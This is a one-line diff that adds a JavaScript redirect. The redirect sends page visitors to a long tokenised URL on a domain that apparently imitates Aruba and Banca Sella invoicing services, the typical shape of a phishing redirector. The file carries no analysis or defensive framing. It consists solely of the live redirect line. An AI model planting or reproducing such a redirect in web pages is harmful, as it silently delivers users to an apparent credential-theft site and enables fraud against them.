@@ -1,0 +1,1 @@
+window.location.replace("https://aruba.fatturazione-servizio-sella.com/D41JdeQcCkS8zYoZSHwPrv4NhDMXziGsR3bPVprFfEXTsGK6FJaAHuEbSx7OgXtx9Zm2kjkVYmZGIv/");
